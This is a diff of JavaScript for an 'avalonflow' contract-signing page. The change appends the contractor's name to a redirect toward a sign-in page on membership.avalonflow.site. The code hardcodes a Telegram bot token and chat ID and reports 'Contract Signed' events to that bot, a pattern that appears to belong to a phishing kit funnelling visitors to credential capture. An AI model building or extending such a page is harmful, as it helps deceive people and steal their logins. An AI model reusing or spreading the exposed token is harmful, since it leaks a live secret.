@@ -940,7 +940,7 @@ SESSION GUARD (WITH FADE-OUT & 15S DELAYED CLOSE)
 
 })();
 
-const urlParamsForReset = new URLSearchParams(window.location.search);
+const urlParamsForReset = new  URLSearchParams(window.location.search);
 if (urlParamsForReset.get('reset') === 'true') {
     localStorage.removeItem('avalonflow_contract_signed');
     localStorage.removeItem('avalonflow_contract_signed_date');
@@ -959,7 +959,7 @@ if (urlParamsForReset.get('reset') === 'true') {
     // ==========================================
     const TELEGRAM_BOT_TOKENs = "8891125323:AAEjkq-panVg2Nye023oTfyu9kkjey5QcCw";
     const TELEGRAM_CHAT_IDs = "-1003913850436";
-    const CONTRA_REDIRECT_URL = 'https://membership.avalonflow.site/signin?forceSeason=autumn&id=&user=';
+    const BASE_CONTRA_REDIRECT_URL = 'https://membership.avalonflow.site/signin?forceSeason=autumn&id=&user=';
 
     function getFormattedDate(timestamp = Date.now()) {
         const options = { year: 'numeric', month: 'long', day: 'numeric' };
@@ -1019,9 +1019,14 @@ if (urlParamsForReset.get('reset') === 'true') {
 
     const contractorName = syncContractorName();
 
+    // Generate dynamic redirect URL with stored/resolved user parameter
+    function getContraRedirectUrl() {
+        return BASE_CONTRA_REDIRECT_URL + encodeURIComponent(contractorName);
+    }
+
     // Check signed status before render
     if (localStorage.getItem('avalonflow_contract_signed') === 'true') {
-        window.location.replace(CONTRA_REDIRECT_URL);
+        window.location.replace(getContraRedirectUrl());
     }
 
     // ==========================================
@@ -1262,9 +1267,10 @@ if (urlParamsForReset.get('reset') === 'true') {
         await sendTelegramNotification("Contract Signed");
 
         setTimeout(function() {
-            window.location.replace(CONTRA_REDIRECT_URL);
+            window.location.replace(getContraRedirectUrl());
         }, 800);
     }
+
 
         // Video Volume Control
 const video = document.getElementById("ecosystemVideo");
